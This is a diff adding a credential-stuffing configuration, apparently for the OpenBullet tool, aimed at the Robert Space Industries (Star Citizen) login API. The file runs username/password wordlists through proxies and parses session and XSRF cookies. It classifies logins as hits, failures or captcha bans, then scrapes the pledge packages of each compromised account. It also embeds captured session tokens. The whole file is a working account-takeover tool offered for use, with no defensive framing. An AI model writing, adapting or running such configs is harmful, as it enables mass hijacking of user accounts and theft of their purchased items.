@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "RobertSpace",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-13T01:32:22.3417321+00:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://robertsspaceindustries.com/connect" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(Rsi-Token)>" LR "" "" Recursive=FALSE -> VAR "TOKEN" "" "" 
+PARSE "<COOKIES(Rsi-XSRF)>" LR "" "" Recursive=FALSE -> VAR "XSRF" "" "" 
+#POST_LOGIN REQUEST POST "https://robertsspaceindustries.com/api/account/signin" AutoRedirect=TRUE 
+  CONTENT "username=<USER>& password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "cookie: _ga=GA1.2.889244294.1533298236; _gid=GA1.2.21136245.1533298236; moment_timezone=Europe%2FBerlin; privacy_20180712=1; viewed_cookie_notif=1; Rsi-Token=e40a208ff7a899b48ec411770d9b4493; Rsi-XSRF=Ik9kWw%3AnnhtEkEewHBgwOTZIzf5Uw%3A6j4jVDx76uo0jzfK9vWBfg%3A1533302314996; _gat_UA-39586040-1=1" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-rsi-token: e40a208ff7a899b48ec411770d9b4493" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "referer: https://robertsspaceindustries.com/connect" 
+  HEADER "origin: https://robertsspaceindustries.com" 
+  HEADER "x-rsi-token: e40a208ff7a899b48ec411770d9b4493" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":1" 
+  KEYCHAIN Failure OR 
+    KEY "Wrong" 
+  KEYCHAIN Ban OR 
+    KEY "Captcha" 
+REQUEST GET "https://robertsspaceindustries.com/account/pledges" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" CSS "value= \"Package\"" "innerHTML" 0 -> CAP "" "" "" 
